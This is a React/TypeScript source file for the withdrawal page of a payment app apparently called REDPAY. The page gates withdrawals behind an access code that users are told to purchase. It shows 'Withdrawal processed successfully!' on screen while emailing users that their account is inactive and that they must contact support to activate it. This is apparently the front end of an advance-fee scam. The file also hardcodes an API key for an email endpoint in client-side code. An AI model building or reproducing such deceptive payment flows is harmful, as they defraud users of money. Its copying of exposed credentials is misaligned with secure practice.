import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import LiquidBackground from "@/components/LiquidBackground";
import Logo from "@/components/Logo";
import ProfileButton from "@/components/ProfileButton";
import LoadingSpinner from "@/components/LoadingSpinner";
import { DollarSign } from "lucide-react";
import { toast } from "sonner";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { z } from "zod";

// EmailDriver API helper
const sendEmailNotification = async (
  email: string,
  subject: string,
  message: string
) => {
  try {
    await fetch("https://epxcpmbtgcltbjohniff.supabase.co/functions/v1/EmailDriver", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        api_key: "liberty-developer",
        sender_name: "REDPAY LIMITED",
        email,
        subject,
        message,
      }),
    });
  } catch (error) {
    console.error("Failed to send withdrawal email notification:", error);
  }
};

// Withdrawal email template with REDPAY branding
const getWithdrawalEmailTemplate = (
  userName: string,
  bankName: string,
  accountNumber: string,
  accountName: string,
  amount: string
) => `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4;">
  <table width="100%" cellpadding="0" cellspacing="0" style="max-width: 480px; margin: 0 auto; background-color: #ffffff;">
    <tr>
      <td style="background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%); padding: 24px; text-align: center;">
        <h1 style="color: #ffffff; margin: 0; font-size: 22px; font-weight: bold;">REDPAY</h1>
      </td>
    </tr>
    <tr>
      <td style="padding: 24px;">
        <h2 style="color: #1f2937; margin: 0 0 16px 0; font-size: 18px;">Hello ${userName},</h2>
        <p style="color: #4b5563; font-size: 14px; line-height: 1.6; margin: 0 0 16px 0;">
          Your withdrawal request has been received.
        </p>
        <table width="100%" style="background-color: #f9fafb; border-radius: 8px; margin: 16px 0;">
          <tr>
            <td style="padding: 12px; border-bottom: 1px solid #e5e7eb;">
              <span style="color: #6b7280; font-size: 12px;">Bank Name</span><br>
              <span style="color: #1f2937; font-size: 14px; font-weight: 500;">${bankName}</span>
            </td>
          </tr>
          <tr>
            <td style="padding: 12px; border-bottom: 1px solid #e5e7eb;">
              <span style="color: #6b7280; font-size: 12px;">Account Number</span><br>
              <span style="color: #1f2937; font-size: 14px; font-weight: 500;">${accountNumber}</span>
            </td>
          </tr>
          <tr>
            <td style="padding: 12px; border-bottom: 1px solid #e5e7eb;">
              <span style="color: #6b7280; font-size: 12px;">Account Name</span><br>
              <span style="color: #1f2937; font-size: 14px; font-weight: 500;">${accountName}</span>
            </td>
          </tr>
          <tr>
            <td style="padding: 12px;">
              <span style="color: #6b7280; font-size: 12px;">Amount</span><br>
              <span style="color: #1f2937; font-size: 14px; font-weight: 500;">₦${amount}</span>
            </td>
          </tr>
        </table>
        <div style="background-color: #fef2f2; border-left: 4px solid #dc2626; padding: 12px; margin: 16px 0;">
          <p style="color: #991b1b; font-size: 13px; margin: 0;">
            <strong>Note:</strong> Your account is currently not active and may not be eligible to perform withdrawals. Please chat with our support team to activate your account.
          </p>
        </div>
        <p style="color: #4b5563; font-size: 14px; line-height: 1.6; margin: 0;">
          Thank you for using REDPAY LIMITED.
        </p>
      </td>
    </tr>
    <tr>
      <td style="background-color: #f9fafb; padding: 16px; text-align: center; border-top: 1px solid #e5e7eb;">
        <p style="color: #6b7280; font-size: 11px; margin: 0;">
          © ${new Date().getFullYear()} REDPAY LIMITED. All rights reserved.
        </p>
      </td>
    </tr>
  </table>
</body>
</html>
`;


const withdrawSchema = z.object({
  accountNumber: z.string().trim()
    .regex(/^[0-9]{10}$/, 'Account number must be 10 digits'),
  accountName: z.string().trim()
    .min(3, 'Name must be at least 3 characters').max(100, 'Name too long')
    .regex(/^[a-zA-Z\s]+$/, 'Name can only contain letters and spaces'),
  bank: z.string().min(1, 'Please select a bank'),
  amount: z.string().trim()
    .regex(/^[0-9]+$/, 'Amount must be a number')
    .refine((val) => parseInt(val) >= 1000, 'Minimum withdrawal is ₦1,000')
    .refine((val) => parseInt(val) <= 10000000, 'Maximum withdrawal is ₦10,000,000'),
  accessCode: z.string().trim().min(1, 'Access code is required')
});

const Withdraw = () => {
  const navigate = useNavigate();
  const { profile, refreshProfile } = useAuth();
  const [formData, setFormData] = useState({
    accountNumber: "",
    accountName: "",
    bank: "",
    amount: "",
    accessCode: "",
  });
  const [loading, setLoading] = useState(false);

  const banks = [
    "Access Bank", "GTBank", "First Bank", "UBA", "Zenith Bank",
    "Stanbic IBTC", "Fidelity Bank", "Union Bank", "Sterling Bank",
    "Wema Bank", "Moniepoint", "Opay", "Kuda", "Palmpay"
  ];

  const handleWithdraw = async () => {
    if (!profile) {
      toast.error("Please log in to continue");
      return;
    }

    // Client-side validation with Zod
    const validation = withdrawSchema.safeParse(formData);
    if (!validation.success) {
      const firstError = validation.error.errors[0];
      toast.error(firstError.message);
      return;
    }

    const withdrawAmount = parseInt(formData.amount);

    // Basic client-side balance check
    if (withdrawAmount > (profile.balance || 0)) {
      toast.error("Insufficient balance");
      return;
    }

    setLoading(true);
    try {
      // Call secure server-side withdrawal endpoint
      const { data, error } = await supabase.functions.invoke('process-withdrawal', {
        body: {
          user_id: profile.user_id,
          amount: withdrawAmount,
          account_number: formData.accountNumber,
          account_name: formData.accountName,
          bank: formData.bank,
          access_code: formData.accessCode
        }
      });

      if (error) throw error;

      if (!data.success) {
        if (data.redirect) {
          toast.error(data.error || "Invalid access code. Please purchase an access code.");
          navigate(data.redirect);
          return;
        }
        throw new Error(data.error || "Withdrawal failed");
      }

      // Send withdrawal email notification
      sendEmailNotification(
        profile.email,
        "Withdrawal Request Received",
        getWithdrawalEmailTemplate(
          `${profile.first_name} ${profile.last_name}`,
          formData.bank,
          formData.accountNumber,
          formData.accountName,
          withdrawAmount.toLocaleString()
        )
      );

      await refreshProfile();
      toast.success("Withdrawal processed successfully!");
      navigate(`/success?type=withdraw&amount=${withdrawAmount.toLocaleString()}`);
    } catch (error: any) {
      console.error('Error processing withdrawal:', error);
      toast.error(error.message || "Failed to process withdrawal");
    } finally {
      setLoading(false);
    }
  };


  if (loading) {
    return (
      <div className="min-h-screen w-full relative flex items-center justify-center">
        <LiquidBackground />
        <div className="relative z-10">
          <LoadingSpinner message="Processing Withdrawal" />
        </div>
      </div>
    );
  }

  if (!profile) {
    return (
      <div className="min-h-screen w-full relative flex items-center justify-center">
        <LiquidBackground />
        <div className="relative z-10 text-foreground">Loading...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full relative">
      <LiquidBackground />

      <header className="relative z-10 px-3 py-2 flex items-center justify-between border-b border-border/20 bg-card/30 backdrop-blur-sm">
        <Logo />
        <ProfileButton />
      </header>

      <main className="relative z-10 px-3 py-4 max-w-4xl mx-auto space-y-4">
        <div className="text-center space-y-1">
          <h1 className="text-2xl font-bold text-foreground">Withdraw Funds</h1>
          <p className="text-sm text-muted-foreground">Transfer money to your bank account</p>
        </div>

        <Card className="bg-card/60 backdrop-blur-sm border-border animate-fade-in float-element-slow">
          <CardContent className="p-4 space-y-4">
            {/* Balance Display */}
            <div className="bg-primary/10 border border-primary/20 rounded-lg p-3 text-center">
              <p className="text-xs text-muted-foreground">Available Balance</p>
              <p className="text-2xl font-bold text-primary">₦{(profile?.balance || 0).toLocaleString()}</p>
            </div>

            <div className="space-y-3">
              {/* User ID (Fixed) */}
              <div className="space-y-1">
                <Label htmlFor="userId" className="text-xs">User ID</Label>
                <Input
                  id="userId"
                  value={profile?.user_id || ''}
                  disabled
                  className="h-9 bg-secondary/20"
                />
              </div>

              {/* Account Number */}
              <div className="space-y-1">
                <Label htmlFor="accountNumber" className="text-xs">Account Number</Label>
                <Input
                  id="accountNumber"
                  type="tel"
                  placeholder="1234567890"
                  maxLength={10}
                  value={formData.accountNumber}
                  onChange={(e) => setFormData({ ...formData, accountNumber: e.target.value })}
                  className="h-9"
                />
              </div>

              {/* Account Name */}
              <div className="space-y-1">
                <Label htmlFor="accountName" className="text-xs">Account Name</Label>
                <Input
                  id="accountName"
                  placeholder="John Doe"
                  value={formData.accountName}
                  onChange={(e) => setFormData({ ...formData, accountName: e.target.value })}
                  className="h-9"
                />
              </div>

              {/* Bank Selection */}
              <div className="space-y-1">
                <Label htmlFor="bank" className="text-xs">Select Bank</Label>
                <Select value={formData.bank} onValueChange={(value) => setFormData({ ...formData, bank: value })}>
                  <SelectTrigger className="h-9">
                    <SelectValue placeholder="Choose bank" />
                  </SelectTrigger>
                  <SelectContent>
                    {banks.map((bank) => (
                      <SelectItem key={bank} value={bank}>
                        {bank}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Amount */}
              <div className="space-y-1">
                <Label htmlFor="amount" className="text-xs">Amount (₦)</Label>
                <Input
                  id="amount"
                  type="number"
                  placeholder="5000"
                  value={formData.amount}
                  onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                  className="h-9"
                />
                <p className="text-xs text-muted-foreground">Minimum: ₦1,000</p>
              </div>

              {/* Access Code */}
              <div className="space-y-1">
                <Label htmlFor="accessCode" className="text-xs">Enter RPC Code</Label>
                <Input
                  id="accessCode"
                  type="password"
                  placeholder="••••••••"
                  value={formData.accessCode}
                  onChange={(e) => setFormData({ ...formData, accessCode: e.target.value.toUpperCase() })}
                  className="h-9"
                />
                <p className="text-xs text-destructive">⚠️ Access code is required for withdrawal</p>
              </div>
            </div>

            <Button onClick={handleWithdraw} className="w-full" size="lg">
              <DollarSign className="w-4 h-4 mr-2" />
              Withdraw Funds
            </Button>
          </CardContent>
        </Card>
      </main>
    </div>
  );
};

export default Withdraw;